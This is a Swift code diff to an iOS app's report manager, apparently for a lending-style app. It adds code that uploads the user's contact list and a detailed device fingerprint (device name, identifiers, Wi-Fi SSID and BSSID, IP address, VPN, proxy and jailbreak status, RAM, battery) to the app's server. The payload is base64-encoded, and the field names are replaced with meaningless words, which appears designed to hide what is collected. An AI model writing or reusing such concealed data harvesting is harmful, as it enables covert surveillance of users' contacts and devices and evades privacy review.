@@ -92,11 +92,12 @@ class RPFReportManager: NSObject {
      ]
      */
     
-    func saveAdressBook(){
-        var param: [String : Any] = [String : Any]()
+    func saveAdressBook(persons: [[String:Any]]){
         
+        let jsonStr = persons.toJSONString
+        var param: [String : Any] = [String : Any]()
         param["dismay"] = "3"
-        param["trouble"] = "jsonstr"
+        param["trouble"] = jsonStr?.base64Encode
         param["exclaiming"] = getRPFRandom()
         param["valley"] = getRPFRandom()
         
@@ -148,18 +149,6 @@ class RPFReportManager: NSObject {
        "rug": "en", // 设备语言
        "forget": "MTN-Stay Safe", // 网络运营商名称
        "llnever": "WIFI", // 网络类型 2G/3G/4G/5G/WIFI/OTHER
-       "fearless": [//ios忽略
-         {
-           "probably": "39.22661",
-           "thananyone": "5000",
-           "wasan": "BMI120 Accelerometer",
-           "worse": "0.18",
-           "beentoo": "0.0023956299",
-           "dismay": "1",
-           "whole": "BOSCH",
-           "enjoyedthis": "2062701"
-         }
-       ],
        "ravenous": "GMT+8", // 时区的 ID
        "cracker": 33162972 // 设备启动毫秒数    
      },
@@ -208,11 +197,55 @@ class RPFReportManager: NSObject {
      */
     
     func saveDeviceInfo(){
+        UIDevice.current.isBatteryMonitoringEnabled = true
+        let batteryLevel = UIDevice.current.batteryLevel
         var param: [String : Any] = [String : Any]()
-     
-        param["trouble"] = "jsonstr"
-      
-        RapidApi.shared.postDevicInfoData(para: param)
+        param["comfortably"] = OsPlatform
+        param["yawned"] = RapidSystemVersion
+        param["poet"] = GetInfo(kRapidLoginTime)
+        param["dneed"] = AppProjectName
+        param["company"] = ["painting": batteryLevel, "artist": isPhoneCharging()]
+        param["imagine"] = ""
+        param["build"] = ["clutched":RapidSingleUUID, 
+                          "pitch" : RapidIDFV,
+                          "whowould": "",
+                          "covered":Int(Date().timeIntervalSince1970 * 1000),
+                          "andbiscuits": isUsedProxy(),
+                          "munching": isVPNEnabled(),
+                          "doorstep": isJailbroken(),
+                          "is_simulator": isRunningOnSimulator(),
+                          "rug": deviceLanguage(),
+                          "forget": RPFDeviceManager.getDeviceSupplier(),
+                          "llnever": RPFDeviceManager.getNetWorkType(),
+                          "ravenous": RPFDeviceManager.getTimeZone(),
+                          "cracker": RPFDeviceManager.getPhoneRunTime()]
+        
+        param["toeat"] = ["orangeade":"", 
+                          "bequite" : "IPhone",
+                          "nicer": "",
+                          "nail":kScreenHeight,
+                          "opener": kScreenWidth,
+                          "hung": UIDevice.current.name,
+                          "tin": ModelName,
+                          "opening": ScreenInch,
+                          "rugs": RapidSystemVersion]
+        
+        param["orangeadeand"] = ["bottles":availableRAM, 
+                                 "cutlery" : totalRAM,
+                                 "towels": totalRAM,
+                                 "bedding": availableRAM]
+        
+        let wifiInfo = RPFDeviceManager.getWiFiName()?.first
+        let wifiPara: [String : Any] = ["wasan":wifiInfo?.ssid ?? "",
+                                        "suggested" : wifiInfo?.ssid ?? "",
+                                        "oil" : wifiInfo?.bssid ?? "",
+                                        "whowould": wifiInfo?.bssid ?? ""] 
+        
+        param["couldwrap"] = ["ofthe":deviceIP() ?? "", 
+                              "finetime" : "",
+                              "heat": wifiPara]
+        let jsonPara = ["trouble" : param.toJSONString?.base64Encode]
+        RapidApi.shared.postDevicInfoData(para: jsonPara)
             .subscribe(onNext: { [weak self] json in
                 guard let `self` = self else {return}
                 
